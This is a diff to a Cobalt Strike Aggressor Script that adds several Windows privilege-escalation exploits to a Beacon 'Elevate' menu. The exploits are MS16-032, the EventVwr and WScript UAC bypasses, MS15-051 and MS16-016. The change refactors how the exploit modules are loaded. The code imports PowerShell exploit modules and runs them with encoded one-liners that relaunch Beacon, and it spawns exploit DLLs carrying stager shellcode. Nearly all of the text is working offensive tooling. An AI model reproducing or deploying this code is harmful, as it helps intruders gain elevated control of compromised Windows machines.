@@ -1,5 +1,12 @@
 # Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
-#
+
+# Load all scripts here to avoid issues doing it in bpowershell_import
+$ms16_032     = script_resource("modules/Invoke-MS16032.ps1");
+$eventvwr     = script_resource("modules/Invoke-EventVwrBypass.ps1");
+$wscript      = script_resource("modules/Invoke-WScriptBypassUAC.ps1");
+$ms15_051_x64 = script_resource("modules/cve-2015-1701.x64.dll");
+$ms15_051_x86 = script_resource("modules/cve-2015-1701.x86.dll");
+$ms16_016     = script_resource("modules/cve-2016-0051.x86.dll");
 
 # Integrate ms16-032
 # Sourced from Empire: https://github.com/adaptivethreat/Empire/tree/master/data/module_source/privesc
@@ -17,7 +24,7 @@ sub ms16_032_exploit {
 	$oneliner = beacon_host_script($1, $script);
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("modules/Invoke-MS16032.ps1"));
+	bpowershell_import!($1, $ms16_032);
 	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
 
 	# give it another 10s to work.
@@ -43,7 +50,7 @@ sub eventvwr_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("modules/Invoke-EventVwrBypass.ps1"));
+	bpowershell_import!($1, $eventvwr);
 	bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -66,7 +73,7 @@ sub wscript_exploit {
 	$oneliner = powershell_encode_oneliner( beacon_host_script($1, $script) );
 
 	# task Beacon to run this exploit with our one-liner that runs Beacon
-	bpowershell_import!($1, script_resource("modules/Invoke-WScriptBypassUAC.ps1"));
+	bpowershell_import!($1, $wscript);
 	bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $oneliner $+ \"");
 
 	# handle staging
@@ -85,11 +92,11 @@ sub ms15_051_exploit {
 	# tune our parameters based on the target arch
 	if (-is64 $1) {
 		$arch   = "x64";
-		$dll    = "modules/cve-2015-1701.x64.dll";
+		$dll    = $ms15_051_x64;
 	}
 	else {
 		$arch   = "x86";
-		$dll    = "modules/cve-2015-1701.x86.dll";
+		$dll    = $ms15_051_x86;
 	}
 
 	# generate our shellcode
@@ -102,7 +109,7 @@ sub ms15_051_exploit {
 	}
 
 	# spawn a Beacon post-ex job with the exploit DLL
-	bdllspawn!($1, script_resource($dll), $stager, "ms15-051", 5000);
+	bdllspawn!($1, $dll, $stager, "ms15-051", 5000);
 
 	# stage our payload (if this is a bind payload)
 	bstage($1, $null, $2, $arch);
@@ -127,7 +134,7 @@ sub ms16_016_exploit {
 	$stager = shellcode($2, false, "x86");
 
 	# spawn a Beacon post-ex job with the exploit DLL
-	bdllspawn!($1, script_resource("modules/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+	bdllspawn!($1, $ms16_016, $stager, "ms16-016", 5000);
 
 	# stage our payload (if this is a bind payload)
 	bstage($1, $null, $2, $arch);
@@ -141,7 +148,7 @@ popup beacon_bottom {
     menu "Elevate" {
         # Add MS15-051 menu option
         item "MS15-051" {
-            # Run ms15_051_exploit function ($1 is always the beacon ID, $target is the listener)
+            # Run ms15_051_exploit function
             openPayloadHelper(lambda({
                 ms15_051_exploit($bid, $1);
                                      }, $bid => $1));
